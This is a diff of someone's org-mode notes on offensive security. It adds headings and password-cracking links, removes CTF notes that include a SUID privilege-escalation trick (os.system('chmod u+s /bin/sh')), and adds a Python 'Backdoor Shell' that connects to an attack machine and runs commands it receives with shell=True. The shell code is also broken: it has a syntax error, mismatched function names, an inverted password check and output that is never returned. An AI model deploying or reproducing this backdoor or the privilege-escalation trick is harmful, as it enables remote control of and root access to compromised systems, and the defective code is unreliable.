@@ -1,26 +1,69 @@
 #+TAGS: sec_o
 
 
-* Offensive
+* Offensive							      :sec_o:
 * Description
-* Phases
-** Recon
-** Enumeration
-** Exploitation
-** Maintaining Access 
-** Covering Tracks
+* Recon
+* Enumeration
+* Exploitation
+** Passwords
+*** Cmds
+- [[file://home/crito/org/tech/security/security_tools/hashcat.org][hashcat]]
+- [[file://home/crito/org/tech/security/security_tools/john_the_ripper.org][John the Ripper]]
+*** Links
+[[http://www.adeptus-mechanicus.com/codex/jtrhcmkv/jtrhcmkv.php][John the Ripper and Hashcat - Markov Mode Comparison]]
+* Maintaining Access 
+* Covering Tracks
 * Attacks
 - Man in the Middle
 - Ruby attack
 - Cold boot
 - Evil Maid
-* CTF
-[[https://www.youtube.com/watch?v%3Dk1iFjyrsQqI][Boot2Root Challenge - SkyDog CTF - RWBNetSec]]
-- viewing image data with exiftool
-- crack zip passwords with fcrackzip
-- if a file is set root:root 777 with os.system() this can be used for priv escal
-  - change contents of os.system('chmod u+s /bin/sh')
+- Shellshock
+- Cross Site Request Forgery (CSRF)
+- Cross Site Tracing (XST)
 
+* Code
+** Python
+*** Backdoor Shell
+#+BEGIN_SRC py
+#!/usr/bin/python
+import subprocess #Process commands
+import socket #Process socket data
+
+host = '127.0.0.1' # Attack Machine
+port = 443 # Attack Port
+passwd = 's3cr3t' 
+
+# chek password
+def Login():
+    global s
+    s.send("Login: ")
+    pwd = s.recv(1024)
+
+    if pwd.strip() is passwd:
+        Login()
+    else:
+        s.send("Connected #> ")
+        shell()
+
+# Execute shell cmds
+def Shell();
+    while True:
+        data = s.recv(1024)
+
+        if data.strip() == ":kill":
+            break
+
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output = proc.stdout.read() + proc.stderr.read()
+        s.send("#> ")
+
+# Start Script
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+Login()
+#+END_SRC
 * Lecture
 * Tutorial
 ** PluralSight - System Hacking - Dale Meredith
